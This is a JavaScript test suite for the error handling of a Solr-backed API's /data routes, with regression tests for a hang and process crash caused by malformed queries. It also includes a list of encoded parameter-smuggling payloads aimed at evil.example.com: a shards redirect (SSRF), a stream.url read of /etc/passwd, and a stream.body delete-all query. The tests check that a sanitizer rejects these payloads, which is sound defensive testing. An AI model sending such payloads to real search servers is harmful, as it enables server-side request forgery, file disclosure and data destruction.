/**
 * /data/* error-path tests — routes/dataRouter.js
 *
 * PLAN_ELIMINATE_SELF_CALL.md step 5. The characterization suite
 * (test.data-router.spec.js) pins the happy paths; it deliberately asserts nothing about
 * failures, which is how the defect below survived. This suite covers the failures.
 *
 * WHAT THIS IS GUARDING
 * ---------------------
 * Before the internalQuery conversion, `subQuery()` did `JSON.parse(body)` on whatever came
 * back from the HTTP self-call. `util/http.js`'s httpRequest discards res.statusCode, and an
 * inner error response is the plain-text string "A Database Error Occured: …", not JSON — so
 * the parse threw a SyntaxError inside a promise. `/distinct` had no rejection handler on
 * that promise, so:
 *
 *   1. the rejection went unhandled;
 *   2. app.js:34 swallows the resulting uncaughtException and keeps running;
 *   3. the request never reached next() -- it hung forever, holding a worker slot;
 *   4. the process's async_hooks state was now corrupt, and the next Solr-backed request
 *      aborted with "Assertion failed: (trigger_async_id) >= (-1)".
 *
 * Reproduced 3/3 locally from a single `?q=foo%3A%28` followed by `/data/taxon_category/`,
 * with a 22-frame native stack identical to the recorded production abort in
 * api.err.crash-162500. The "survives a malformed query" test at the bottom is the
 * regression test for the abort; the short per-request timeouts are what turn the hang into
 * a failure instead of a 150s stall.
 *
 * REQUIREMENTS (skipped automatically if unmet): API running at API_URL with a populated
 * Solr behind it. Dev here is :23001 -- :3001 is production on this host.
 */

const assert = require('chai').assert
const http = require('http')
const https = require('https')
const { URL } = require('url')

const API_URL = process.env.API_URL || 'http://localhost:3001'

// Short enough that a hung request fails the test rather than stalling the suite. A healthy
// error response on these routes is sub-second; a healthy taxon_category is a few seconds.
const ERROR_TIMEOUT_MS = 20000

function request (path, { accept = 'application/json', timeout = ERROR_TIMEOUT_MS } = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(API_URL + path)
    const mod = u.protocol === 'https:' ? https : http
    const req = mod.request({
      hostname: u.hostname,
      port: u.port,
      path: u.pathname + u.search,
      method: 'GET',
      headers: { Accept: accept }
    }, (res) => {
      let data = ''
      res.on('data', (c) => { data += c })
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: data }))
    })
    req.on('error', reject)
    req.setTimeout(timeout, () => req.destroy(new Error(`HUNG: no response within ${timeout}ms`)))
    req.end()
  })
}

// Malformed Solr syntax, several ways. Each of these reaches Solr, comes back an error, and
// used to become a SyntaxError in the caller.
const MALFORMED_Q = [
  ['unbalanced paren', 'foo%3A%28'],
  ['dangling boolean', 'a+AND+AND+b'],
  ['unterminated quote', 'host_group%3A%22open']
]

// Parameter-smuggling payloads. The `&` is encoded so it survives Express's query parser as
// part of the value and only becomes a separator at Solr's decoding layer. SolrQuerySanitizer
// is what stops these; internalQuery runs it at the same point in the pipeline the HTTP path
// did (after query construction, before the request goes out).
const SMUGGLED_Q = [
  ['shards', '*%3A*%26shards%3Dhttp%3A%2F%2Fevil.example.com%2Fsolr'],
  ['stream.url', '*%3A*%26stream.url%3Dfile%3A%2F%2F%2Fetc%2Fpasswd'],
  ['stream.body', '*%3A*%26stream.body%3D%3Cdelete%3E%3Cquery%3E*%3A*%3C%2Fquery%3E%3C%2Fdelete%3E'],
  ['double-encoded shards', '*%3A*%2526shards%253Dhttp%3A%2F%2Fevil.example.com'],
  ['qt', '*%3A*%26qt%3D%2Fupdate']
]

describe('/data/* — error paths', function () {
  this.timeout(120000)

  let apiUp = false

  before(async function () {
    try {
      const res = await request('/health', { accept: '*/*' })
      apiUp = res.status === 200
    } catch (e) {
      apiUp = false
    }
    if (!apiUp) console.log(`    [skip] API not reachable at ${API_URL}`)
  })

  beforeEach(function () {
    if (!apiUp) this.skip()
  })

  describe('malformed ?q= is answered, not hung', function () {
    MALFORMED_Q.forEach(([label, q]) => {
      it(`GET /data/distinct with ${label} returns 4xx`, async function () {
        const res = await request(`/data/distinct/genome/host_group?q=${q}`)
        assert.isAtLeast(res.status, 400, `expected a client error, got ${res.status}`)
        assert.isBelow(res.status, 500,
          `a malformed client query must not be reported as a server error (got ${res.status})`)
      })
    })

    it('the error body is JSON, not a raw database error string', async function () {
      const res = await request('/data/distinct/genome/host_group?q=foo%3A%28')
      let parsed
      assert.doesNotThrow(() => { parsed = JSON.parse(res.body) },
        `body was not JSON: ${res.body.slice(0, 200)}`)
      assert.isObject(parsed)
      assert.property(parsed, 'message')
      // The old failure mode leaked Solr/Express internals into the response.
      assert.notMatch(res.body, /A Database Error Occured/i)
      assert.notMatch(res.body, /org\.apache\.solr/i)
    })

    it('a failed response is not cached (a later valid request still works)', async function () {
      // apicache is configured with onlyStatus200, so an error must not be stored under the
      // route key and served back to the next caller.
      await request('/data/distinct/taxonomy/taxon_rank?q=foo%3A%28')
      const ok = await request('/data/distinct/taxonomy/taxon_rank', { timeout: 60000 })
      assert.equal(ok.status, 200)
      assert.isObject(JSON.parse(ok.body))
    })

    it('GET /data/summary_by_taxon with a malformed taxon_id returns 4xx', async function () {
      const res = await request('/data/summary_by_taxon/foo%3A%28')
      assert.isAtLeast(res.status, 400)
      assert.isBelow(res.status, 500)
    })

    it('GET /data/subsystem_summary with a malformed genome_id returns 4xx', async function () {
      const res = await request('/data/subsystem_summary/foo%3A%28')
      assert.isAtLeast(res.status, 400)
      assert.isBelow(res.status, 500)
    })
  })

  describe('SSRF / parameter smuggling through ?q=', function () {
    // The gate that catches these is the reason internalQuery runs sanitizeQueryString on
    // the converted Solr string rather than on the RQL. /distinct is the sharpest case in
    // the codebase: req.query.q is interpolated into the Solr query verbatim.
    SMUGGLED_Q.forEach(([label, q]) => {
      it(`rejects a smuggled ${label} parameter`, async function () {
        const res = await request(`/data/distinct/genome/host_group?q=${q}`)
        assert.notEqual(res.status, 200,
          `smuggled ${label} was accepted -- the sanitizer is not covering this path`)
        assert.isAtLeast(res.status, 400)
      })
    })
  })

  describe('empty and missing results', function () {
    it('subsystem_summary for a nonexistent genome returns an empty array, not a hang', async function () {
      // The old code's `if (facet_pivot)` had no else branch, so any response without a
      // pivot never called next().
      const res = await request('/data/subsystem_summary/99999999.9')
      assert.equal(res.status, 200)
      assert.deepEqual(JSON.parse(res.body), [])
    })

    it('summary_by_taxon for a nonexistent taxon returns zeroed counts', async function () {
      const res = await request('/data/summary_by_taxon/99999999')
      assert.equal(res.status, 200)
      const body = JSON.parse(res.body)
      assert.isObject(body)
      Object.keys(body).forEach((k) => assert.equal(body[k], 0, `${k} should be 0`))
    })
  })

  describe('the process survives a malformed query', function () {
    it('serves a normal Solr-backed request after one that fails', async function () {
      // THE regression test for the async_hooks abort. Before the fix this pair killed the
      // worker 3/3: the first request hung, and the second aborted the process, so this
      // assertion fails with ECONNRESET rather than a bad status.
      const bad = await request('/data/distinct/genome/host_group?q=foo%3A%28')
      assert.isAtLeast(bad.status, 400)

      const good = await request('/data/taxon_category/', {
        accept: 'application/solr+json',
        timeout: 90000
      })
      assert.equal(good.status, 200,
        'the API stopped serving after a malformed query -- worker likely aborted')
      assert.property(JSON.parse(good.body), 'superkingdom')
    })
  })
})
